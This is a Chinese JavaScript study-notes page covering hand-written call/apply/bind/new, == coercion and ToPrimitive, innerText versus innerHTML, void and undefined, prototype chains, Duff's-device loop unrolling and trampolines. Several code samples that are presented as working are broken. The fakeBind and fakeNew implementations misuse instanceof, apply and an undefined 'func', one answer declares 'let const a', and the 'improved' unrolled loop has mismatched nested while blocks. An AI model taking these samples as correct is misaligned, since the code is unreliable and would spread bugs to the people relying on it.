<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  a: <span class="string">'1'</span>,</span><br><span class="line">  b: <span class="number">2</span>,</span><br><span class="line">  c: [<span class="number">345</span>],</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">reject(obj, [<span class="string">'a'</span>, <span class="string">'c'</span>]); <span class="comment">// &#123;b: 2&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Array&lt;object&gt;</span></span><br><span class="line"><span class="keyword">var</span> arr = [&#123; <span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">3</span>, <span class="attr">c</span>: <span class="number">5</span> &#125;, &#123; <span class="attr">a</span>: <span class="number">1</span> &#125;];</span><br><span class="line"></span><br><span class="line">arr.map(<span class="function"><span class="params">row</span> =&gt;</span> reject(row, [<span class="string">'a'</span>, <span class="string">'c'</span>])); <span class="comment">// [ &#123;b: 3&#125;, &#123;&#125; ]</span></span><br></pre></td></tr></table></figure>
<h3 id="35-函数-call-apply-bind-方法、以及-new-操作符的实现"><a href="#35-函数-call-apply-bind-方法、以及-new-操作符的实现" class="headerlink" title="35 函数 call/apply/bind 方法、以及 new 操作符的实现"></a>35 函数 call/apply/bind 方法、以及 new 操作符的实现</h3><p>（*知道实现方法有助于更好得理解）</p>
<h4 id="call-apply"><a href="#call-apply" class="headerlink" title="call/apply"></a>call/apply</h4><p>首先来看 call/apply 方法都做了什么：修改函数的 this 指向；（传参）并执行函数。由此可以如下定义：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 模拟call方法</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="built_in">Function</span>.prototype.fakeCall = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> obj = <span class="built_in">arguments</span>[<span class="number">0</span>] || <span class="built_in">window</span>;</span><br><span class="line">  obj.func = <span class="keyword">this</span>;</span><br><span class="line">  <span class="keyword">let</span> result = obj.func(...[...arguments].slice(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">delete</span> obj.func;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 模拟apply方法</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="built_in">Function</span>.prototype.fakeApply = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> obj = <span class="built_in">arguments</span>[<span class="number">0</span>] || <span class="built_in">window</span>;</span><br><span class="line">  obj.func = <span class="keyword">this</span>;</span><br><span class="line">  <span class="keyword">let</span> result = <span class="built_in">arguments</span>[<span class="number">1</span>] ? obj.func(...arguments[<span class="number">1</span>]) : obj.func();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">delete</span> obj.func;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// test</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayInfo</span>(<span class="params">name, age</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`name: <span class="subst">$&#123;name&#125;</span>, age: <span class="subst">$&#123;age&#125;</span>, value: <span class="subst">$&#123;<span class="keyword">this</span>.value&#125;</span>`</span>);</span><br><span class="line">&#125;</span><br><span class="line">sayInfo(<span class="string">'man1'</span>, <span class="number">12</span>); <span class="comment">// name: man1, age: 12, value: undefined</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> testObj = &#123;</span><br><span class="line">  value: <span class="string">'testObj'</span>,</span><br><span class="line">&#125;;</span><br><span class="line">sayInfo.fakeCall(testObj, <span class="string">'man2'</span>, <span class="number">23</span>); <span class="comment">// name: man2, age: 23, value: testObj</span></span><br><span class="line">sayInfo.fakeApply(testObj, [<span class="string">'man3'</span>, <span class="number">35</span>]); <span class="comment">// name: man3, age: 35, value: testObj</span></span><br></pre></td></tr></table></figure>
<h4 id="bind"><a href="#bind" class="headerlink" title="bind"></a>bind</h4><p>再来看看 bind 方法都做了什么：修改函数的 this 指向及原型；（传参）并返回一个函数。由此可以如下定义：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.fakeBind = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">let</span> obj = <span class="built_in">arguments</span>[<span class="number">0</span>] || <span class="built_in">window</span>;</span><br><span class="line">	<span class="keyword">let</span> _argu = [...arguments].slice(<span class="number">1</span>);</span><br><span class="line">	<span class="keyword">let</span> _this = <span class="keyword">this</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">let</span> Func = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">let</span> self = <span class="keyword">this</span>.instanceof Func ? <span class="keyword">this</span> : obj;</span><br><span class="line">		<span class="keyword">return</span> _this.apply(self, ..._argu.concat([...arguments]));	<span class="comment">// 或_this.call(obj, _argu.concat([...arguments]));</span></span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 或直接Object.create()</span></span><br><span class="line">	<span class="keyword">let</span> f = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line">	f.prototype = <span class="keyword">this</span>.prototype;</span><br><span class="line">	Func.prototype = <span class="keyword">new</span> f();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> Func;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="new"><a href="#new" class="headerlink" title="new"></a>new</h4><p>看看使用 new 操作符发生了什么：创建一个空对象；该空对象的原型指向构造函数（链接原型）：将构造函数的 prototype 赋值给对象的 <strong>proto</strong>属性；绑定 this：将对象作为构造函数的 this 传进去，并执行该构造函数；返回新对象：如果构造函数返回的是一个对象，则返回该对象；否则（若没有返回值或者返回基本类型），返回第一步中新创建的对象；</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeNew</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> obj = &#123;&#125;;</span><br><span class="line">  <span class="keyword">let</span> _argu = [].shift.call(<span class="built_in">arguments</span>);</span><br><span class="line">  obj._proto_ = <span class="built_in">Object</span>.setPrototypeOf(obj, _argu[<span class="number">0</span>].prototype); <span class="comment">// 或_argu[0].prototype;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> result = func.apply(obj, _argu);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Object</span>.prototype.toString.call(result) === <span class="string">'[object Object]'</span> ? result : obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="36-的隐式转换"><a href="#36-的隐式转换" class="headerlink" title="36 ==的隐式转换"></a>36 <code>==</code>的隐式转换</h3><p>以下假设为比较 x == y 的情况，Type(x)指的是 x 的数据类型，Type(y)指的是 y 的类型，最终返回值只有 true 或 false，会按照下面的步骤进行比较，如果有返回时就停止之后的步骤:</p>
<ul>
<li><p>Type(x)与 Type(y)相同时，进行严格相等比较</p>
</li>
<li><p>x 是 undefined，而 y 是 null 时，返回 true</p>
</li>
<li><p>x 是 null，而 y 是 undefined 时，返回 true</p>
</li>
<li><p>Type(x)是 Number 而 Type(y)是 String 时，进行 x == ToNumber(y)比较</p>
</li>
<li><p>Type(x)是 String 而 Type(y)是 Number 时，进行 ToNumber(x) == y 比较</p>
</li>
<li><p>Type(x)是 Boolean 时，进行 ToNumber(x) == y</p>
</li>
<li><p>Type(y)是 Boolean 时，进行 x == ToNumber(y)</p>
</li>
<li><p>Type(x)是 Number 或 String 其中一种，而 Type(y)是个 Object 时，进行 x == ToPrimitive(y)比较</p>
</li>
<li><p>Type(x)是个 Object，而 Type(y)是 Number 或 String 其中一种时，进行 ToPrimitive(x) == y 比较</p>
</li>
<li><p>其他情况，返回 false</p>
</li>
</ul>
<h4 id="ToPrimitive"><a href="#ToPrimitive" class="headerlink" title="ToPrimitive"></a>ToPrimitive</h4><p>在发生转换的时候，js 其实都是会将操作对象转化为原始的对象，这也是最为诟病的地方，因为 js 很难直接抛出错误，她会用一套自己的方法去理解我们的错误，并做相应的调整，哪怕这些错误我们是无意识的。所以我们要知道她的转换方式，才能做到知己知彼，对代码的控制更为精准。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ToPrimitive(input, PreferredType?) //PreferredType: Number 或者 String</span><br></pre></td></tr></table></figure>
<p>流程如下：</p>
<ul>
<li>input 为原始值，直接返回；</li>
<li>不是原始值，调用该对象的 valueOf()方法，如果结果是原始值，返回原始值；</li>
<li>调用 valueOf()不是原始值，调用此对象的 toString()方法，如果结果为原始值，返回原始值；</li>
<li>如果返回的不是原始值，抛出异常 TypeError。<br>其中 PreferredType 控制线调取 valueOf()还是 toString()。</li>
</ul>
<p>思考如下几道题：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ques.1</span></span><br><span class="line"><span class="built_in">console</span>.log([] == ![]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ques.2</span></span><br><span class="line"><span class="keyword">if</span> (a == <span class="number">1</span> &amp;&amp; a == <span class="number">2</span> &amp;&amp; a == <span class="number">3</span>) &#123;</span><br><span class="line">  <span class="comment">// 如何走进此判断语句</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ques.3</span></span><br><span class="line"><span class="built_in">console</span>.log([] + []);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ques.4</span></span><br><span class="line"><span class="built_in">console</span>.log(&#123;&#125; + <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
<p>结果如下：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ans.1</span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ans.2，方法不唯一，如valueOf、数组shift()</span></span><br><span class="line"><span class="keyword">let</span> <span class="keyword">const</span> a = &#123;</span><br><span class="line">	i: <span class="number">1</span>,</span><br><span class="line">	toString: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> a.i++;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ans.3</span></span><br><span class="line"><span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ans.4</span></span><br><span class="line">[object <span class="built_in">Object</span>]<span class="number">0</span></span><br></pre></td></tr></table></figure>
<h3 id="37-innerText、textContent-和-innerHTML-三者的区别"><a href="#37-innerText、textContent-和-innerHTML-三者的区别" class="headerlink" title="37 innerText、textContent 和 innerHTML 三者的区别"></a>37 innerText、textContent 和 innerHTML 三者的区别</h3><p>首先，“innerText”、“textContent”和“innerHTML”这三个属性都可以设置标签中间的文本内容。（相同点）</p>
<p>不同点：</p>
<ul>
<li>设置标签中间的内容：如果内容中含有 html 标签的话，“innerText”和“textContent”是无法把 html 标签转化成标签的，而是当做纯文本内容显示出来，而“innerHTML”则可把内容中的标签转化成 html 标签</li>
<li>获取标签中间的内容：“innerText”,“textContent”:获取的是该标签和该标签下子标签中的文本内容；“innerHTML”:获取的是该标签的所有内容，包括其子标签</li>
<li>textContent 却把代码搬过来并且解析不受样式的影响，innerText 解析代码但是受样式影响的</li>
</ul>
<h4 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">"test"</span>&gt;</span>测试一下：<span class="tag">&lt;<span class="name">span</span>&gt;</span>h1能看到么？<span class="tag">&lt;/<span class="name">span</span>&gt;</span>：<span class="tag">&lt;<span class="name">span</span>&gt;</span>能<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>分别来看下这三者的返回结果：<br><img src="/images/notes/js/p-1.png" alt="p-1.png"></p>
<p>把其中一个<code>&lt;span&gt;</code>标签设置<code>display: none;</code>：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">"test"</span>&gt;</span>测试一下：<span class="tag">&lt;<span class="name">span</span>&gt;</span>h1能看到么？<span class="tag">&lt;/<span class="name">span</span>&gt;</span>：<span class="tag">&lt;<span class="name">span</span>&gt;</span>能<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>再来看看这三者的返回结果：<br><img src="/images/notes/js/p-2.png" alt="p-2.png"></p>
<p>把其中一个<code>&lt;span&gt;</code>标签设置<code>visibility: hidden;</code>：<br><img src="/images/notes/js/p-3.png" alt="p-3.png"></p>
<h3 id="38-void操作符"><a href="#38-void操作符" class="headerlink" title="38 void操作符"></a>38 <code>void</code>操作符</h3><p>void 运算符 对给定的表达式进行求值，然后返回 undefined。语法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void expression</span><br></pre></td></tr></table></figure>
<h4 id="为什么推荐用-void-0-而不是-undefined-来设置-undefined-值"><a href="#为什么推荐用-void-0-而不是-undefined-来设置-undefined-值" class="headerlink" title="为什么推荐用 void 0 而不是 undefined 来设置 undefined 值"></a>为什么推荐用 void 0 而不是 undefined 来设置 undefined 值</h4><p>因为 JavaScript 的代码 undefined 是一个变量，而并非是一个关键字，这是 JavaScript 语言公认的设计失误之一，虽然在新版浏览器中给定义 undefined 并赋值是无效的但还是建议使用 void 0 来获取 undefined 值。</p>
<h3 id="39-使用-void"><a href="#39-使用-void" class="headerlink" title="39 使用 void"></a>39 使用 void</h3><p>当年的 a 标签</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:void(0);"</span>&gt;</span></span><br><span class="line">  这个链接点击之后不会做任何事情，如果去掉 void()， 点击之后整个页面会被替换成一个字符 0。</span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>避免问题：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在使用立即执行的函数表达式时，可以利用 void 运算符让 JavaScript 引擎把一个function关键字识别成函数表达式而不是函数声明（语句）。</span></span><br><span class="line"><span class="keyword">void</span> (<span class="function"><span class="keyword">function</span> <span class="title">iife</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> bar = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> baz = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> foo = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    bar();</span><br><span class="line">    baz();</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">var</span> biz = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line"></span><br><span class="line">  foo();</span><br><span class="line">  biz();</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
<h3 id="40-不受“管束”的-undefined"><a href="#40-不受“管束”的-undefined" class="headerlink" title="40 不受“管束”的 undefined"></a>40 不受“管束”的 undefined</h3><p>猛然见发现 IIFE（立即执行函数）有一个优点，就是解决 undefined 标识符的默认值被覆盖导致异常。如</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">undefined</span> = <span class="number">123</span>;</span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">undefined</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> a;</span><br><span class="line">  <span class="keyword">if</span> (a === <span class="literal">undefined</span>) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
<p>为什么会这样呢？因为早期一些浏览器（至少我发现 IE8 是这样的）并没有制止 undefined 赋值的操作，也不报错，这样就会导致如下代码在部分浏览器中使 undefined 不再具备其意义。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">undefined</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="literal">undefined</span>); <span class="comment">// 某些浏览器是true，新的浏览器都还是undefined</span></span><br></pre></td></tr></table></figure>
<p>为了不影响老代码的正常运行，新版浏览器并不对 undefined 赋值操作进行报错，只是视为一条无用的表达式。</p>
<h3 id="41-Object和Function的爱恨纠葛"><a href="#41-Object和Function的爱恨纠葛" class="headerlink" title="41 Object和Function的爱恨纠葛"></a>41 <code>Object</code>和<code>Function</code>的爱恨纠葛</h3><p>先上一张图：<br><img src="/images/js/p-function-object.png" alt="p-function-object.png"></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 构造器Function的构造器是它自身</span></span><br><span class="line"><span class="built_in">Function</span>.constructor === <span class="built_in">Function</span>; <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造器Object的构造器是Function（由此可知所有构造器的constructor都指向Function）</span></span><br><span class="line"><span class="built_in">Object</span>.constructor === <span class="built_in">Function</span>; <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造器Function的__proto__是一个特殊的匿名函数function() &#123;&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Function</span>.__proto__); <span class="comment">// function() &#123;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 这个特殊的匿名函数的__proto__指向Object的prototype原型。</span></span><br><span class="line"><span class="built_in">Function</span>.__proto__.__proto__ === <span class="built_in">Object</span>.prototype; <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Object的__proto__指向Function的prototype，也就是上面所述的特殊匿名函数</span></span><br><span class="line"><span class="built_in">Object</span>.__proto__ === <span class="built_in">Function</span>.prototype; <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Function</span>.prototype === <span class="built_in">Function</span>.__proto__; <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<h3 id="42-循环展开：麻烦的真相"><a href="#42-循环展开：麻烦的真相" class="headerlink" title="42 循环展开：麻烦的真相"></a>42 循环展开：麻烦的真相</h3><p>任何编程语言中的循环都会增加额外的开销。循环通常需要维护一个计数器和/或检查结束条件，这两者都花费时间。</p>
<p>移除循环开销将提供一些性能提升。如</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">  <span class="comment">// do...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 优化</span></span><br><span class="line"><span class="comment">// do..</span></span><br><span class="line"><span class="comment">// do..</span></span><br><span class="line"><span class="comment">// do..</span></span><br><span class="line"><span class="comment">// do..</span></span><br><span class="line"><span class="comment">// do..</span></span><br><span class="line"><span class="comment">// do..</span></span><br><span class="line"><span class="comment">// do..</span></span><br><span class="line"><span class="comment">// do..</span></span><br></pre></td></tr></table></figure>
<p>不过数量少的迭代循环性能提升不大。有两个因素决定了循环展开是否会带来可观的好处：</p>
<ul>
<li>循环迭代的次数。需要许多（如上千）个迭代才能带来明显的区别。</li>
<li>循环体开销和循环开销的比例。如果前者比后者的比例越大，性能提升越少。这是因为更多的时间是花费在循环体，而不是循环开销中。</li>
</ul>
<p>然而现实中要展开成千上万的迭代并不现实。现实的解决方案是使用达夫设备经典算法的变种，部分展开循环。比如 1000 个迭代的循环可以分成 125 个展开 8 次的迭代：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> testVal = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> n = iterations % <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (n--) &#123;</span><br><span class="line">  testVal++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">n = <span class="built_in">parseInt</span>(iterations / <span class="number">8</span>);</span><br><span class="line"><span class="keyword">while</span> (n--) &#123;</span><br><span class="line">  testVal++;</span><br><span class="line">  testVal++;</span><br><span class="line">  testVal++;</span><br><span class="line">  testVal++;</span><br><span class="line">  testVal++;</span><br><span class="line">  testVal++;</span><br><span class="line">  testVal++;</span><br><span class="line">  testVal++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>改进：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> testVal = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> n = iterations &gt;&gt; <span class="number">3</span>;</span><br><span class="line"><span class="keyword">while</span>(n--) &#123;</span><br><span class="line"><span class="keyword">while</span>(n--) &#123;</span><br><span class="line">	testVal++;</span><br><span class="line">	testVal++;</span><br><span class="line">	testVal++;</span><br><span class="line">	testVal++;</span><br><span class="line">	testVal++;</span><br><span class="line">	testVal++;</span><br><span class="line">	testVal++;</span><br><span class="line">	testVal++;</span><br><span class="line">&#125;</span><br><span class="line">n = iterations - testVal;</span><br><span class="line"><span class="keyword">while</span>(n--) &#123;</span><br><span class="line">	testVal++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>达夫设备指的是由 Tom Duff 在 1983 年开发的一种循环展开的 C 语言优化技术。循环展开是汇编语言中常用的技术，细小的优化就可以在内存复制等领域发挥作用。具有优化功能的编译器也可能进行自动的循环展开。</p>
</blockquote>
<h3 id="43-trampoline-蹦床函数"><a href="#43-trampoline-蹦床函数" class="headerlink" title="43 trampoline 蹦床函数"></a>43 trampoline 蹦床函数</h3><p>可用于解决函数调用栈大小限制问题。即在最后一步调用函数，且实现函数的柯里化（多参函数转换成单参数函数）</p>
<p>当调用栈超出大小限制后，会抛出 RangeError。用蹦床（trampoline）原理的控制结构来消除这类错误。它的基本原理是，使用蹦床<strong>展平化处理</strong>，而不是深度嵌套的递归调用。</p>
<p>一个方法是返回一个函数，它包装调用，而不是直接调用。可以使用 trampoline 来实现这一点：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trampoline</span>(<span class="params">fun</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (fun &amp;&amp; <span class="keyword">typeof</span> fun === <span class="string">'function'</span>) &#123;</span><br><span class="line">    fun = fun();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> fun;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (y &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> sum.bind(<span class="literal">null</span>, x + <span class="number">1</span>, y - <span class="number">1</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">trampoline(sum(<span class="number">1</span>, <span class="number">100000</span>));</span><br></pre></td></tr></table></figure>
<p>由于调用链的间接性，使用蹦床增加了相互递归函数的一些开销。然而，慢总比溢出好。</p>
<h3 id="44-String-优化"><a href="#44-String-优化" class="headerlink" title="44 String 优化"></a>44 String 优化</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// way 1</span></span><br><span class="line"><span class="string">'a,b,c'</span>.split(<span class="string">','</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// way 2</span></span><br><span class="line"><span class="string">'a0b0c0'</span>.split(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>
